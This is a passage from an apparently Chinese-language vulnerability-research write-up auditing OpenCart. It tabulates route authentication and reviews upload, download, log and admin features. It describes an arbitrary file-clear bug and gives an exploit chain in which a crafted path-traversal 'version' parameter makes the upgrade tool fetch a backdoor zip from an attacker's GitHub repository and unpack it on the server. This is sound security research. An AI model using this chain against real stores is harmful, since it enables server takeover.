class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs csv">method,cookie,token,<br>account/account.index,True,True,<br>account/address.index,True,True,<br>account/address.list,True,True,<br>account/address.form,True,True,<br>account/address.save,True,True,<br>account/address.delete,True,True,<br>account/affiliate.index,True,True,<br>account/affiliate.save,True,True,<br>account/custom_field.index,False,False,查询用户组信息，无法利用<br>account/download.index,True,True,<br>account/download.download,True,True,<br>account/edit.index,True,True,<br>account/edit.save,True,True,<br>account/forgotten.index,True,True,<br>account/forgotten.confirm,True,True,<br>account/forgotten.reset,True,True,<br>account/forgotten.password,True,True,<br>account/newsletter.index,True,True,<br>account/newsletter.save,True,True,<br>account/order.index,True,True,<br>account/order.history,False,False,能够查询订单历史状态，无数据泄露<br>account/order.reorder,True,True,<br>account/password.index,True,True,<br>account/password.save,True,True,<br>account/payment_method.index,True,True,<br>account/payment_method.list,True,True,<br>account/payment_method.delete,True,True,<br>account/register.index,True,True,<br>account/register.register,True,True,<br>account/returns.index,True,True,<br>account/returns.add,True,True,<br>account/returns.save,True,True,<br>account/returns.success,True,True,<br>account/reward.index,True,True,<br>account/subscription.index,True,True,<br>account/subscription.history,False,False,信息查询，无数据泄露<br>account/subscription.order,False,False,信息查询，无数据泄露<br>account/success.index,True,True,<br>account/tracking.index,True,True,<br>account/tracking.autocomplete,True,True,<br>account/transaction.index,True,True,<br>account/wishlist.index,True,True,<br>account/wishlist.list,False,False,使用session进行鉴权<br>account/wishlist.add,False,False,使用session进行鉴权<br>account/wishlist.remove,False,False,使用session进行鉴权<br>api/account/login.index,True,True,<br>api/localisation/currency.index,True,True,<br>api/sale/affiliate.index,True,True,<br>api/sale/cart.index,True,True,<br>api/sale/cart.add,True,True,<br>api/sale/cart.edit,True,True,<br>api/sale/cart.remove,True,True,<br>api/sale/coupon.index,True,True,<br>api/sale/customer.index,True,True,<br>api/sale/order.load,True,True,<br>api/sale/order.comment,True,True,<br>api/sale/order.confirm,True,True,<br>api/sale/order.delete,True,True,<br>api/sale/order.addHistory,True,True,<br>api/sale/payment_address.index,True,True,<br>api/sale/payment_method.index,True,True,<br>api/sale/payment_method.save,True,True,<br>api/sale/reward.index,True,True,<br>api/sale/reward.maximum,True,True,<br>api/sale/reward.available,True,True,<br>api/sale/shipping_address.index,True,True,<br>api/sale/shipping_method.index,True,True,<br>api/sale/shipping_method.save,True,True,<br>api/sale/voucher.index,True,True,<br>api/sale/voucher.add,True,True,<br>api/sale/voucher.remove,True,True,<br>checkout/cart.index,True,True,<br>checkout/cart.list,False,False,使用session检测登录<br>checkout/cart.add,True,True,<br>checkout/cart.edit,False,False,使用session检测登录<br>checkout/cart.remove,False,False,使用session检测登录<br>checkout/checkout.index,False,False,使用session检测登录<br>checkout/confirm.confirm,True,True,<br>checkout/failure.index,True,True,<br>checkout/payment_address.save,True,True,<br>checkout/payment_address.address,True,True,<br>checkout/payment_method.getMethods,True,True,<br>checkout/payment_method.save,True,True,<br>checkout/payment_method.comment,False,False,使用session<br>checkout/payment_method.agree,False,False,使用session<br>checkout/register.save,True,True,<br>checkout/shipping_address.save,True,True,<br>checkout/shipping_address.address,True,True,<br>checkout/shipping_method.quote,True,True,<br>checkout/shipping_method.save,True,True,<br>checkout/success.index,True,True,<br>checkout/voucher.index,True,True,<br>checkout/voucher.add,True,True,<br>checkout/voucher.remove,False,False,使用seesion<br>checkout/voucher.success,True,True,<br>cms/blog.index,True,True,页面未启用<br>cms/blog.addComment,False,False,页面未启用<br>common/cart.info,True,True,<br>common/cart.removeProduct,False,False,使用session<br>common/cart.removeVoucher,False,False,使用session<br>common/cookie.confirm,False,False,添加cookie信息<br>common/currency.save,False,False,修改session与cookie信息<br>common/home.index,True,True,<br>common/maintenance.index,True,True,<br>cron/cron.index,False,False,定时任务，无效接口<br>error/not_found.index,True,True,<br>information/contact.index,True,True,<br>information/contact.send,False,False,邮件发送功能<br>information/contact.success,True,True,<br>information/gdpr.action,False,False,gdpr 邮件<br>information/information.info,False,False,信息查询接口<br>information/sitemap.index,True,True,<br>localisation/country.index,False,False,国家信息查询接口<br>product/compare.index,True,True,<br>product/compare.add,False,False,商品对比功能<br>product/manufacturer.index,True,True,<br>product/review.write,False,False,需要session与review_token<br>product/review.list,False,False,需要session与review_token<br>product/search.index,True,True,<br>product/special.index,True,True,<br>startup/application.index,False,False,startup为前置动作，用于主动作初始化，无需鉴权<br>startup/currency.index,False,False,<br>startup/customer.index,False,False,<br>startup/error.index,False,False,<br>startup/event.index,False,False,<br>startup/extension.index,False,False,<br>startup/language.index,False,False,<br>startup/marketing.index,False,False,<br>startup/sass.index,False,False,<br>startup/seo_url.index,False,False,<br>startup/session.index,False,False,<br>startup/setting.index,False,False,<br>startup/startup.index,False,False,<br>startup/tax.index,False,False,<br>tool/upload.index,False,False,文件上传<br></code></pre></td></tr></table></figure>
+
+<p>经功能测试与代码审计，未发现明显漏洞</p>
+<h4 id="文件上传下载分析"><a href="#文件上传下载分析" class="headerlink" title="文件上传下载分析"></a>文件上传下载分析</h4><p>在添加订单的部分存在文件上传接口，尝试绕过前端过滤直接向API上传文件，发现仍存在过滤，查看源码分析是否存在绕过可能</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/RHENXAyW.png" srcset="/img/loading.gif" lazyload alt="RHENXAyW"></p>
+<ul>
+<li><p>字符过滤 basename过滤</p>
+<p>没法路径穿越，只能向指定目录上传文件</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/ezprijf1.png" srcset="/img/loading.gif" lazyload alt="ezprijf1"></p>
+</li>
+<li><p>后缀白名单</p>
+<p>检查最后一个后缀，没法通过多后缀绕过</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/qb3SeQiT.png" srcset="/img/loading.gif" lazyload alt="qb3SeQiT"></p>
+</li>
+<li><p>MIME过滤</p>
+<p>这个过滤无所谓，改HTTP请求就行</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/NkmPYek6.png" srcset="/img/loading.gif" lazyload alt="NkmPYek6"></p>
+</li>
+<li><p>添加随机后缀</p>
+<p>随机后缀，甚至不知道上传文件的真实文件名了，不太能利用文件上传</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/mcK6g6i4.png" srcset="/img/loading.gif" lazyload alt="mcK6g6i4"></p>
+</li>
+</ul>
+<p>在账户管理中存在一个下载的接口，分析是否存在路径绕过等实现任意文件下载操作</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/13eDHrfJ.png" srcset="/img/loading.gif" lazyload alt="13eDHrfJ"></p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/CjKmdM9k.png" srcset="/img/loading.gif" lazyload alt="CjKmdM9k"></p>
+<p>下载需要<code>download_id</code>，就是前面添加的随机后缀，根据<code>download_id</code>查数据库找到真实文件路径，不能手动指定下载的文件，无法利用</p>
+<h3 id="管理面API"><a href="#管理面API" class="headerlink" title="管理面API"></a>管理面API</h3><p>由于管理API在route到对应服务时做权限检查，白名单匹配，权限方面无明显漏洞，直接对高危模块进行详细分析</p>
+<h4 id="文件编辑分析"><a href="#文件编辑分析" class="headerlink" title="文件编辑分析"></a>文件编辑分析</h4><p>在主题编辑中存在直接编辑twig模板文件的功能，尝试使用该功能实现任意文件读写操作</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/oByVjRI7.png" srcset="/img/loading.gif" lazyload alt="oByVjRI7"></p>
+<p>使用realpath进行路径检查，只能在指定的目录中操作，不太能利用</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/Au8e7Lmo.png" srcset="/img/loading.gif" lazyload alt="Au8e7Lmo"></p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/FLsSrQCk.png" srcset="/img/loading.gif" lazyload alt="FLsSrQCk"></p>
+<h4 id="图片管理器文件上传"><a href="#图片管理器文件上传" class="headerlink" title="图片管理器文件上传"></a>图片管理器文件上传</h4><p>网站所有的图片上传、编辑等操作都使用图片管理器实现，该管理器有文件预览、文件上传、文件夹创建、文件删除等功能，存在利用风险</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/CzSCFoX5.png" srcset="/img/loading.gif" lazyload alt="CzSCFoX5"></p>
+<ul>
+<li><p>文件预览</p>
+<p>文件预览功能对文件名做了basename，但是路径没做过滤，存在路径绕过查看任意目录文件的可能，但是对预览文件的类型做了限制，只能预览图片文件和目录，存在漏洞但是影响较小</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/Y6KWEDi4.png" srcset="/img/loading.gif" lazyload alt="Y6KWEDi4"></p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/nQqlfUmd.png" srcset="/img/loading.gif" lazyload alt="nQqlfUmd"></p>
+</li>
+<li><p>文件上传</p>
+<p>realpath+后缀白名单，无法任意目录或任意文件上传</p>
+</li>
+<li><p>文件夹创建</p>
+<p>basename+realpath 无法任意目录文件夹创建</p>
+</li>
+<li><p>删除</p>
+<p>realpath 无法路径穿越</p>
+</li>
+</ul>
+<h4 id="数据库备份恢复"><a href="#数据库备份恢复" class="headerlink" title="数据库备份恢复"></a>数据库备份恢复</h4><p>能够对数据库进行备份，下载上传删除备份文件，能够根据上传的sql文件修改数据库（该功能存在风险，但属于管理员功能，不属于漏洞）</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/Bz3EHld9.png" srcset="/img/loading.gif" lazyload alt="Bz3EHld9"></p>
+<p>分析该功能的文件上传下载，同样存在basename的过滤，无法利用</p>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p>该功能可以下载和删除用户上传的文件，操作基于添加的随机后缀，无法直接指定文件名，因此也不太能利用</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/RDLmGKaj.png" srcset="/img/loading.gif" lazyload alt="RDLmGKaj"></p>
+<h4 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h4><p>日志功能能够预览日志文件，下载日志文件以及清除日志文件，尝试分析该功能是否存在任意文件读写</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/99QDyhGO.png" srcset="/img/loading.gif" lazyload alt="99QDyhGO"></p>
+<ul>
+<li><p>下载</p>
+<p>经典basename，目录限制无法下载任意文件</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/AO06xG8Y.png" srcset="/img/loading.gif" lazyload alt="AO06xG8Y"></p>
+</li>
+<li><p>清除</p>
+<p>清除功能没有过滤文件名，可以直接清空任意文件（甚至是系统文件）</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/83gD6DoJ.png" srcset="/img/loading.gif" lazyload alt="83gD6DoJ"></p>
+</li>
+</ul>
+<h4 id="系统升级"><a href="#系统升级" class="headerlink" title="系统升级"></a>系统升级</h4><p>系统的升级功能从github下载zip文件，从http参数中获取版本信息，字符串拼接得到url和文件名，通过构造version参数即可实现路径穿越，从github任意仓库下载zip文件</p>
+<p><img src="OpenCart%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98.assets/sQAL68Hl.png" srcset="/img/loading.gif" lazyload alt="sQAL68Hl"></p>
+<p>在升级包安装功能中，虽然对zip文件内部文件路径做了限制，但是仍然未对version参数进行过滤，传入与download时相同的version即可解压下载的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">install</span>(<span class="hljs-params"></span>): <span class="hljs-title">void</span> </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;load-&gt;<span class="hljs-title function_ invoke__">language</span>(<span class="hljs-string">&#x27;tool/upgrade&#x27;</span>);<br><br>    <span class="hljs-variable">$json</span> = [];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;get[<span class="hljs-string">&#x27;version&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$version</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;get[<span class="hljs-string">&#x27;version&#x27;</span>];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$version</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;user-&gt;<span class="hljs-title function_ invoke__">hasPermission</span>(<span class="hljs-string">&#x27;modify&#x27;</span>, <span class="hljs-string">&#x27;tool/upgrade&#x27;</span>)) &#123;<br>        <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_permission&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$file</span> = DIR_DOWNLOAD . <span class="hljs-string">&#x27;opencart-&#x27;</span> . <span class="hljs-variable">$version</span> . <span class="hljs-string">&#x27;.zip&#x27;</span>;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_file&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$json</span>) &#123;<br>        <span class="hljs-comment">// Unzip the files</span><br>        <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ZipArchive</span>();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$file</span>, <span class="hljs-title class_">\ZipArchive</span>::<span class="hljs-variable constant_">RDONLY</span>)) &#123;<br>            <span class="hljs-variable">$remove</span> = <span class="hljs-string">&#x27;opencart-&#x27;</span> . <span class="hljs-variable">$version</span> . <span class="hljs-string">&#x27;/upload/&#x27;</span>;<br><br>            <span class="hljs-comment">// Check if any of the files already exist.</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$zip</span>-&gt;numFiles; <span class="hljs-variable">$i</span>++) &#123;<br>                <span class="hljs-variable">$source</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">getNameIndex</span>(<span class="hljs-variable">$i</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$source</span>, <span class="hljs-number">0</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$remove</span>)) == <span class="hljs-variable">$remove</span>) &#123;<br>                    <span class="hljs-comment">// Only extract the contents of the upload folder</span><br>                    <span class="hljs-variable">$destination</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$source</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$remove</span>)));<br><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$destination</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>) == <span class="hljs-string">&#x27;install/&#x27;</span>) &#123;<br>                        <span class="hljs-comment">// Default copy location</span><br>                        <span class="hljs-variable">$path</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br>                        <span class="hljs-comment">// Must not have a path before files and directories can be moved</span><br>                        <span class="hljs-variable">$directories</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$destination</span>));<br><br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$directories</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$directory</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$path</span>) &#123;<br>                                <span class="hljs-variable">$path</span> = <span class="hljs-variable">$directory</span>;<br>                            &#125; <span class="hljs-keyword">else</span> &#123;<br>                                <span class="hljs-variable">$path</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$directory</span>;<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(DIR_OPENCART . <span class="hljs-variable">$path</span>) &amp;&amp; !@<span class="hljs-title function_ invoke__">mkdir</span>(DIR_OPENCART . <span class="hljs-variable">$path</span>, <span class="hljs-number">0777</span>)) &#123;<br>                                <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-variable">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_directory&#x27;</span>), <span class="hljs-variable">$path</span>);<br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-comment">// Check if the path is not directory and check there is no existing file</span><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$destination</span>, -<span class="hljs-number">1</span>) != <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(DIR_OPENCART . <span class="hljs-variable">$destination</span>)) &#123;<br>                                <span class="hljs-title function_ invoke__">unlink</span>(DIR_OPENCART . <span class="hljs-variable">$destination</span>);<br>                            &#125;<br><br>                            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&#x27;zip://&#x27;</span> . <span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;#&#x27;</span> . <span class="hljs-variable">$source</span>, DIR_OPENCART . <span class="hljs-variable">$destination</span>)) &#123;<br>                                <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-variable">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_copy&#x27;</span>), <span class="hljs-variable">$source</span>, <span class="hljs-variable">$destination</span>);<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br><br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;text&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;text_patch&#x27;</span>);<br><br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;next&#x27;</span>] = HTTP_CATALOG . <span class="hljs-string">&#x27;install/index.php?route=upgrade/upgrade_1&amp;version=&#x27;</span> . <span class="hljs-variable">$version</span> . <span class="hljs-string">&#x27;&amp;admin=&#x27;</span> . <span class="hljs-title function_ invoke__">rtrim</span>(<span class="hljs-title function_ invoke__">substr</span>(DIR_APPLICATION, <span class="hljs-title function_ invoke__">strlen</span>(DIR_OPENCART), -<span class="hljs-number">1</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;error&#x27;</span>] = <span class="hljs-variable language_">$this</span>-&gt;language-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;error_unzip&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;response-&gt;<span class="hljs-title function_ invoke__">addHeader</span>(<span class="hljs-string">&#x27;Content-Type: application/json&#x27;</span>);<br>    <span class="hljs-variable language_">$this</span>-&gt;response-&gt;<span class="hljs-title function_ invoke__">setOutput</span>(<span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$json</span>));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>漏洞利用</li>
+</ul>
+<p>首先需要利用<code>../</code>的方式拼接url实现路径穿越，从自己的github仓库下载zip文件</p>
+<p>例如 </p>
+<p><code>$version = &#39;../../../example/example_repo/releases/download/v1.0/backdoor&#39;</code>,</p>
+<p>拼接前的url为<code>https://github.com/opencart/opencart/archive/opencart-../../../example/example_repo/releases/download/v1.0/backdoor.zip</code>,</p>
+<p> 实际url</p>
+<p><code>https://github.com/example/example_repo/releases/download/v1.0/backdoor.zip</code>. 完成下载后，调用install实现将 <code>hack.zip</code> 解压到 <code>DIR_OPENCART/install</code>.</p>
+<p>文件名 <code>$file = DIR_DOWNLOAD . &#39;opencart-&#39; . $version . &#39;.zip&#39;</code>, </p>
+<p>实际文件名 <code>DIR_DOWNLOAD/opencart-../../../example/example_repo/releases/download/v1.0/backdoor.zip</code>.</p>
+<p> 这需要在特定的目录下存在 <code>opencart-..</code> <code>example</code> <code>example_repo</code>等文件夹.</p>
+<p>需要找能够任意目录文件夹创建的漏洞</p>
+<p>搜索mkdir寻找满足条件的调用，在<code>security.storatge</code>找到存在任意文件夹创建的漏洞</p>
+<p>该API是修改系统的存储目录，修改之后将存储目录的内容复制到新的目录并删除原目录，但复制过程如果失败，不会修改存储目录为新目录，<strong>也不会删除新建目录</strong></p>
+<p>通过修改存储目录并让复制过程失败，就能实现创建任意目录</p>
+<p>这里其实有正则表达式过滤，但表达式写错了没有过滤成功，通过传入path参数就能创建任意文件夹</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">storage</span>(<span class="hljs-params"></span>): <span class="hljs-title">void</span> </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;load-&gt;<span class="hljs-title function_ invoke__">language</span>(<span class="hljs-string">&#x27;common/security&#x27;</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;request-&gt;get[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$page</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable language_">$this</span>-&gt;request-&gt;get[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span 